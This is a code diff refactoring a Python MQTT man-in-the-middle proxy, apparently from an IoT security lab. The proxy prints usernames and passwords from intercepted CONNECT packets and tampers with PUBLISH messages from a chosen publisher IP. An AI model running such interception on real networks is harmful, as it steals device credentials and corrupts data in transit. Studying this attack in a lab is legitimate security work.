@@ -11,34 +11,43 @@ from common.config import (
 )
 
 
+def process_buffer(buf, dst, tamper_for_ip, client_ip):
+    """Parse all complete MQTT packets currently in buf, forward them, return leftover."""
+    while True:
+        packet, buf = PacketParser.try_parse(buf)
+        if packet is None:
+            return buf
+
+        # Log credentials from CONNECT packets
+        if client_ip is not None:
+            connect_info = PacketParser.parse_connect(packet)
+            if connect_info is not None:
+                print(f"[Proxy] CONNECT from {client_ip}:")
+                print(f"        client_id = {connect_info['client_id']}")
+                print(f"        username  = {connect_info['username']}")
+                print(f"        password  = {connect_info['password']}")
+                print(
+                    f"        proto     = {connect_info['protocol_name']} "
+                    f"v{connect_info['protocol_level']}"
+                )
+
+        if tamper_for_ip is not None and client_ip == tamper_for_ip:
+            packet = PacketTamperer.tamper_publish(packet)
+
+        dst.sendall(packet)
+
+
 def relay(src, dst, tamper_for_ip=None, client_ip=None):
     buf = b""
     try:
         while True:
             data = src.recv(4096)
             if not data:
+                # Drain whatever is still in the buffer before exiting
+                buf = process_buffer(buf, dst, tamper_for_ip, client_ip)
                 break
             buf += data
-            while True:
-                packet, buf = PacketParser.try_parse(buf)
-                if packet is None:
-                    break
-
-                # Log credentials from CONNECT packets
-                if client_ip is not None:
-                    connect_info = PacketParser.parse_connect(packet)
-                    if connect_info is not None:
-                        print(f"[Proxy] CONNECT from {client_ip}:")
-                        print(f"        client_id = {connect_info['client_id']}")
-                        print(f"        username  = {connect_info['username']}")
-                        print(f"        password  = {connect_info['password']}")
-                        print(
-                            f"        proto     = {connect_info['protocol_name']} v{connect_info['protocol_level']}"
-                        )
-
-                if tamper_for_ip is not None and client_ip == tamper_for_ip:
-                    packet = PacketTamperer.tamper_publish(packet)
-                dst.sendall(packet)
+            buf = process_buffer(buf, dst, tamper_for_ip, client_ip)
     except (ConnectionResetError, BrokenPipeError):
         pass
     finally:
@@ -56,7 +65,6 @@ def handle(client_sock, client_ip):
         client_sock.close()
         return
 
-    # Only tamper traffic from the publisher; leave the subscriber alone.
     t1 = threading.Thread(
         target=relay,
         args=(client_sock, broker_sock, PUBLISHER_IP, client_ip),
